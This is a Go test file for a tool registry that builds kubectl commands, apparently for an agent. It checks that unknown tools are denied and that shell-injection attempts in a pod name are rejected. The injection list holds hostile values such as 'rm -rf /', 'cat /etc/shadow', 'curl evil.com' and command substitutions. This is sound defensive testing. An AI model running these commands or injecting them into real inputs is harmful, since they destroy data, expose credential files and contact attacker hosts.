package toolbox

import (
	"reflect"
	"strings"
	"testing"
)

func TestRejectsUnknownTool(t *testing.T) {
	reg := NewToolRegistry()
	attacks := []string{"rm_rf_everything", "exec_into_pod", "delete_namespace", ""}

	for _, tool := range attacks {
		_, _, err := reg.ValidateAndBuild(tool, map[string]string{})
		if err == nil || !strings.Contains(err.Error(), "DENIED") {
			t.Errorf("expected DENIED for unknown tool %q, got: %v", tool, err)
		}
	}
}

func TestBlocksShellInjectionInPodName(t *testing.T) {
	reg := NewToolRegistry()
	injections := []string{
		"my-pod; rm -rf /",
		"my-pod | cat /etc/shadow",
		"my-pod && curl evil.com",
		"my-pod`whoami`",
		"my-pod$(id)",
		"my-pod${HOME}",
		"my-pod > /tmp/pwned",
	}

	for _, inj := range injections {
		_, _, err := reg.ValidateAndBuild("get_pod_logs", map[string]string{
			"namespace": "default",
			"pod":       inj,
		})
		if err == nil || !strings.Contains(err.Error(), "DENIED") {
			t.Fatalf("expected DENIED for injection %q, got: %v", inj, err)
		}
	}
}

func TestGetPodLogsBuildsCorrectCommand(t *testing.T) {
	reg := NewToolRegistry()
	binary, args, err := reg.ValidateAndBuild("get_pod_logs", map[string]string{
		"namespace":  "production",
		"pod":        "api-server-5d8f9c",
		"since":      "1h",
		"tail_lines": "500",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if binary != "kubectl" {
		t.Fatalf("expected kubectl, got %s", binary)
	}

	expected := []string{"logs", "api-server-5d8f9c", "-n", "production", "--since=1h", "--tail=500"}
	if !reflect.DeepEqual(args, expected) {
		t.Fatalf("args mismatch:\n  got:  %v\n  want: %v", args, expected)
	}
}
